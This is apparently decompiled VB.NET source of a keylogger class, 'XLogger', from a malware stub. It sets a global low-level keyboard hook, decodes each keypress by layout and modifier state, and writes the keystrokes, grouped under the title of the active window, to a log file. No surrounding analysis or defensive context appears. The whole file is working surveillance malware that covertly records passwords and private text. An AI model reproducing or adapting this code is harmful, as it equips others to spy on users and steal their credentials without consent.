Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace Stub
	' Token: 0x0200000D RID: 13
	Public Class XLogger
		' Token: 0x0600004B RID: 75 RVA: 0x00005700 File Offset: 0x00003900
		Public Shared Sub callk()
			XLogger._hookID = XLogger.SetHook(XLogger._proc)
			Application.Run()
		End Sub

		' Token: 0x0600004C RID: 76 RVA: 0x00005718 File Offset: 0x00003918
		Private Shared Function SetHook(proc As XLogger.LowLevelKeyboardProc) As IntPtr
			Dim result As IntPtr
			Using currentProcess As Process = Process.GetCurrentProcess()
				result = XLogger.SetWindowsHookEx(XLogger.WHKEYBOARDLL, proc, XLogger.GetModuleHandle(currentProcess.ProcessName), 0UI)
			End Using
			Return result
		End Function

		' Token: 0x0600004D RID: 77 RVA: 0x00005764 File Offset: 0x00003964
		Private Shared Function HookCallback(nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr
			If nCode >= 0 AndAlso wParam = CType(256, IntPtr) Then
				Dim value As Object = Marshal.ReadInt32(lParam)
				Dim obj As Object = (CInt(XLogger.GetKeyState(20)) And 65535) <> 0
				Dim value2 As Object = (CInt(XLogger.GetKeyState(160)) And 32768) <> 0 OrElse (CInt(XLogger.GetKeyState(161)) And 32768) <> 0
				Dim obj2 As Object = XLogger.KeyboardLayout(Conversions.ToUInteger(value))
				If Conversions.ToBoolean(If((Conversions.ToBoolean(obj) OrElse Conversions.ToBoolean(value2)), True, False)) Then
					obj2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj2, Nothing, "ToUpper", New Object(-1) {}, Nothing, Nothing, Nothing))
				Else
					obj2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj2, Nothing, "ToLower", New Object(-1) {}, Nothing, Nothing, Nothing))
				End If
				If Conversions.ToInteger(value) >= 112 AndAlso Conversions.ToInteger(value) <= 135 Then
					obj2 = "[" + Conversions.ToString(Conversions.ToInteger(value)) + "]"
				Else
					Dim left As String = CType(Conversions.ToInteger(value), Keys).ToString()
					If Operators.CompareString(left, "Space", False) = 0 Then
						obj2 = "[SPACE]"
					ElseIf Operators.CompareString(left, "Return", False) = 0 Then
						obj2 = "[ENTER]"
					ElseIf Operators.CompareString(left, "Escape", False) = 0 Then
						obj2 = "[ESC]"
					ElseIf Operators.CompareString(left, "LControlKey", False) = 0 Then
						obj2 = "[CTRL]"
					ElseIf Operators.CompareString(left, "RControlKey", False) = 0 Then
						obj2 = "[CTRL]"
					ElseIf Operators.CompareString(left, "RShiftKey", False) = 0 Then
						obj2 = "[Shift]"
					ElseIf Operators.CompareString(left, "LShiftKey", False) = 0 Then
						obj2 = "[Shift]"
					ElseIf Operators.CompareString(left, "Back", False) = 0 Then
						obj2 = "[Back]"
					ElseIf Operators.CompareString(left, "LWin", False) = 0 Then
						obj2 = "[WIN]"
					ElseIf Operators.CompareString(left, "Tab", False) = 0 Then
						obj2 = "[Tab]"
					ElseIf Operators.CompareString(left, "Capital", False) = 0 Then
						If Operators.ConditionalCompareObjectEqual(obj, True, False) Then
							obj2 = "[CAPSLOCK: OFF]"
						Else
							obj2 = "[CAPSLOCK: ON]"
						End If
					End If
				End If
				Using streamWriter As StreamWriter = New StreamWriter(Settings.LoggerPath, True)
					If Object.Equals(XLogger.CurrentActiveWindowTitle, XLogger.GetActiveWindowTitle()) Then
						streamWriter.Write(RuntimeHelpers.GetObjectValue(obj2))
					Else
						streamWriter.WriteLine(Environment.NewLine)
						streamWriter.WriteLine("###  " + XLogger.GetActiveWindowTitle() + " ###")
						streamWriter.Write(RuntimeHelpers.GetObjectValue(obj2))
					End If
				End Using
			End If
			Return XLogger.CallNextHookEx(XLogger._hookID, nCode, wParam, lParam)
		End Function

		' Token: 0x0600004E RID: 78 RVA: 0x00005A5C File Offset: 0x00003C5C
		Private Shared Function KeyboardLayout(vkCode As UInteger) As String
			Dim num As UInteger = 0UI
			Try
				Dim stringBuilder As StringBuilder = New StringBuilder()
				Dim obj As Object = New Byte(255) {}
				If Not XLogger.GetKeyboardState(CType(obj, Byte())) Then
					Return ""
				End If
				Dim value As Object = XLogger.MapVirtualKey(vkCode, 0UI)
				Dim keyboardLayout As IntPtr = XLogger.GetKeyboardLayout(XLogger.GetWindowThreadProcessId(XLogger.GetForegroundWindow(), num))
				XLogger.ToUnicodeEx(vkCode, Conversions.ToUInteger(value), CType(obj, Byte()), stringBuilder, 5, 0UI, keyboardLayout)
				Return stringBuilder.ToString()
			Catch ex As Exception
			End Try
			Return(CType(vkCode, Keys)).ToString()
		End Function

		' Token: 0x0600004F RID: 79 RVA: 0x00005B04 File Offset: 0x00003D04
		Private Shared Function GetActiveWindowTitle() As String
			Dim num As UInteger = 0UI
			Dim result As String
			Try
				Dim foregroundWindow As IntPtr = XLogger.GetForegroundWindow()
				XLogger.GetWindowThreadProcessId(foregroundWindow, num)
				Dim processById As Object = Process.GetProcessById(CInt(num))
				Dim objectValue As Object = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(processById, Nothing, "MainWindowTitle", New Object(-1) {}, Nothing, Nothing, Nothing))
				If String.IsNullOrWhiteSpace(Conversions.ToString(objectValue)) Then
					objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(processById, Nothing, "ProcessName", New Object(-1) {}, Nothing, Nothing, Nothing))
				End If
				XLogger.CurrentActiveWindowTitle = Conversions.ToString(objectValue)
				result = Conversions.ToString(objectValue)
			Catch ex As Exception
				result = "???"
			End Try
			Return result
		End Function

		' Token: 0x06000050 RID: 80
		Private Declare Auto Function SetWindowsHookEx Lib "user32.dll" (idHook As Integer, lpfn As XLogger.LowLevelKeyboardProc, hMod As IntPtr, dwThreadId As UInteger) As IntPtr

		' Token: 0x06000051 RID: 81
		Private Declare Auto Function UnhookWindowsHookEx Lib "user32.dll" (hhk As IntPtr) As Boolean

		' Token: 0x06000052 RID: 82
		Private Declare Auto Function CallNextHookEx Lib "user32.dll" (hhk As IntPtr, nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr

		' Token: 0x06000053 RID: 83
		Private Declare Auto Function GetModuleHandle Lib "kernel32.dll" (lpModuleName As String) As IntPtr

		' Token: 0x06000054 RID: 84
		Private Declare Function GetForegroundWindow Lib "user32.dll" () As IntPtr

		' Token: 0x06000055 RID: 85
		Private Declare Function GetWindowThreadProcessId Lib "user32.dll" (hWnd As IntPtr, <System.Runtime.InteropServices.OutAttribute()> ByRef lpdwProcessId As UInteger) As UInteger

		' Token: 0x06000056 RID: 86
		Private Declare Auto Function GetKeyState Lib "user32.dll" (keyCode As Integer) As Short

		' Token: 0x06000057 RID: 87
		Private Declare Function GetKeyboardState Lib "user32.dll" (lpKeyState As Byte()) As Boolean

		' Token: 0x06000058 RID: 88
		Private Declare Function GetKeyboardLayout Lib "user32.dll" (idThread As UInteger) As IntPtr

		' Token: 0x06000059 RID: 89
		Private Declare Function ToUnicodeEx Lib "user32.dll" (wVirtKey As UInteger, wScanCode As UInteger, lpKeyState As Byte(), <MarshalAs(UnmanagedType.LPWStr)> <Out()> pwszBuff As StringBuilder, cchBuff As Integer, wFlags As UInteger, dwhkl As IntPtr) As Integer

		' Token: 0x0600005A RID: 90
		Private Declare Function MapVirtualKey Lib "user32.dll" (uCode As UInteger, uMapType As UInteger) As UInteger

		' Token: 0x04000025 RID: 37
		Private Shared CurrentActiveWindowTitle As String

		' Token: 0x04000026 RID: 38
		Private Const WM_KEYDOWN As Integer = 256

		' Token: 0x04000027 RID: 39
		Private Shared _proc As XLogger.LowLevelKeyboardProc = AddressOf XLogger.HookCallback

		' Token: 0x04000028 RID: 40
		Private Shared _hookID As IntPtr = IntPtr.Zero

		' Token: 0x04000029 RID: 41
		Private Shared WHKEYBOARDLL As Integer = 13

		' Token: 0x02000014 RID: 20
		' (Invoke) Token: 0x06000082 RID: 130
		Private Delegate Function LowLevelKeyboardProc(nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr
	End Class
End Namespace
